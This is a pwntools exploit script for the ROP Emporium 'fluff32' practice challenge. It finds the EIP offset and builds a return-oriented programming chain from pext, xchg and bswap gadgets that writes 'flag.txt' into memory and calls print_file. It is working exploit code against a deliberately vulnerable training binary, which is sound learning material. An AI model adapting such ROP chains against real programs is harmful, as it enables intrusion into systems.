from pwn import *
import binascii
import warnings
warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-gef
break print_file
'''.format(**locals())

exe = './fluff32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

def find_eip(payload):
    p = process(exe)
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

eip_offset = find_eip(cyclic(100))
io = start()

print_file = 0x80483d0
exit = 0xf7ded680
data = 0x0804a018

"""
   0x08048543 <+0>:	mov    eax,ebp
   0x08048545 <+2>:	mov    ebx,0xb0bababa
   0x0804854a <+7>:	pext   edx,ebx,eax     // Destination, Source, Mask
   0x0804854f <+12>:	mov    eax,0xdeadbeef
   0x08048554 <+17>:	ret 
"""

"""
  flag.txt -> 66   6C   61   67   2E   74   78   74
           -> 66:  0110 0110


For 66:

0xb0bababa -> 1011 0000 1011 1010 1011 1010 1011 1010
      mask ->                      1   1 11  1   1 11 (valid) -> 0000 0000 0000 0000 0100 1011 0100 1011
      mask ->  111 11   1 1   1                       (valid) -> 0111 1100 1010 0100 0000 0000 0000 0000                 
-----------------------------------------------------
      PEXT
-----------------------------------------------------
      DEST -> 0000 0000 0000 0000 0000 0000 0110 0110
"""

"""
https://www.reddit.com/r/learnprogramming/comments/2j9nuu/x86_assembly_what_is_register_dl_used_for/
https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm
https://www.rapidtables.com/convert/number/ascii-to-hex.html
"""

def generate_mask(string):
    mask_arr = []
    source_pext_string = str(bin(int("b0bababa", 16))[2:])
    for c in string:
        '''
        # some workings and stuff
        print(hex(ord(c)))
        print(ord(c))
        hex_char = str(hex(ord(c)))
        binary_string = binascii.unhexlify(hex_char[2:])
        print(binary_string)
        binary_string = binary_string.decode('utf-8')
        print(bin(int(hex_char[2:],16))).zfill(8)
        bits = bin(int(binary_string, 16))
        print(bits)
        '''
        mask = ""
        destination = str(bin(int(str(hex(ord(c)))[2:] ,16))[2:].zfill(8))
        destination_index = 0
        for i, s in enumerate(source_pext_string):
            if destination_index < 8:
                if s == destination[destination_index]:
                    mask += "1"
                    destination_index += 1
                else:
                    mask += "0"
            else:
                mask += "0"
        mask_arr.append(int(hex(int(mask, 2)),16))
    return mask_arr

mask_arr = generate_mask("flag.txt")

questionable_gadget = 0x08048543
xchg = 0x08048555
pop_ebp = 0x080485bb
full_mask = generate_mask("flag.txt")
pop_ecx_bswap_ecx = 0x08048558
bswap_ecx = 0x08048559

final_exploit = b""
data_offset = 0

for i, c in enumerate(full_mask):
    final_exploit += pack(pop_ebp)
    final_exploit += pack(c)
    final_exploit += pack(questionable_gadget)
    final_exploit += pack(pop_ecx_bswap_ecx)
    final_exploit += pack(data + data_offset)
    final_exploit += pack(bswap_ecx)
    final_exploit += pack(xchg)
    data_offset += 1

payload = flat(
    asm('nop') * eip_offset,  
    final_exploit,
    print_file,
    exit,
    data
)

write("payload", payload)

io.sendlineafter('>', payload)
#io.interactive()

io.recvuntil('Thank you!\n')
flag = io.recv()
success(flag)
	
